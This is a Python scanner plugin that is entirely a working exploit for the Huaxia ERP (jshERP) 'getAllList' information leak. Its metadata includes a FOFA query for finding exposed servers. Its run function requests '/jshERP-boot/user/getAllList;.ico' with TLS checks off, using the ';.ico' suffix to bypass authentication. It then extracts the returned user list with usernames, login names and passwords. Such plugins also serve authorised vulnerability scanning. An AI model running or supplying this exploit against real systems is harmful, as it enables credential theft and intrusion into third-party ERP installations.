#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/3QFE0Pv3LLxtVwJsHEsLZg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '华夏ERP getAllList敏感信息泄露',

      'level'     :   'high',

      'FOFA'      :   '"jshERP-boot"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/jshERP-boot/user/getAllList;.ico'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'userList.*?id.*?username.*?loginName.*?password.*?}}',res.text,re.S):
      result = re.search(r'userList.*?id.*?username.*?loginName.*?password.*?}}',res.text,re.S)
      ret['huixian'] = result.group()
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret